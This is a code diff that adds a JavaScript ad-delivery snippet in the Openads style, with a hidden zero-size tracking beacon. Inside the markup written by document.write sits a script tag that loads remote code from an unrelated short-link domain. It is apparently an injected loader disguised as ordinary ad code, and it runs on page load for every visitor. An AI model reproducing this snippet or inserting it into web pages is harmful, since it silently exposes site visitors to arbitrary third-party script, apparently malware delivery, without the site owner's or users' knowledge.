@@ -1,0 +1,3 @@
+var MAX_0ad671a6 = '';
+MAX_0ad671a6 += "<"+"SCRIPT type=\"text/javascript\" LANGUAGE=\"javascript\" src=\"http://www.qksz.net/1e-dvp7\"> <"+"/SCRIPT><"+"div id=\'beacon_302\' style=\'position: absolute; left: 0px; top: 0px; visibility: hidden;\'><"+"img src=\'http://lists.loadout.com/Openads/www/delivery/lg.php?bannerid=302&amp;campaignid=58&amp;zoneid=24&amp;loc=http%3A%2F%2Fwww.mojonixon.com%2Flyrics%2Fhamletchickenplantdisaster.html&amp;referer=http%3A%2F%2Fwww.mojonixon.com%2Flyrics%2Findex.html&amp;cb=a41a1c6b00\' width=\'0\' height=\'0\' alt=\'\' style=\'width: 0px; height: 0px;\' /><"+"/div><"+"script type=\'text/javascript\'>document.context=\'YTowOnt9\'; <"+"/script>\n";
+document.write(MAX_0ad671a6);
